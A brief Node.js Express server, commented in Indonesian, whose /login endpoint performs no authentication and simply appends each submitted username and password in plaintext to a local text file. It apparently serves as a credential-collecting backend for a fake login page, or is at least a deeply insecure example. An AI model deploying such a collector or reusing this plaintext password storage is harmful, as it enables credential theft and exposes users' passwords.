const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

// Middleware untuk parsing JSON
app.use(bodyParser.json());

// Endpoint login untuk menerima data user
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Simpan data ke file
  const logData = `Username: ${username}, Password: ${password}\n`;

  // Append data ke file loginData.txt
  fs.appendFile('loginData.txt', logData, (err) => {
    if (err) {
      console.error(err);
      return res.json({ success: false, message: 'Gagal menyimpan data!' });
    }

    console.log('Data berhasil disimpan!');
    res.json({ success: true, message: 'Data berhasil dikirim!' });
  });
});

// Start server
app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});
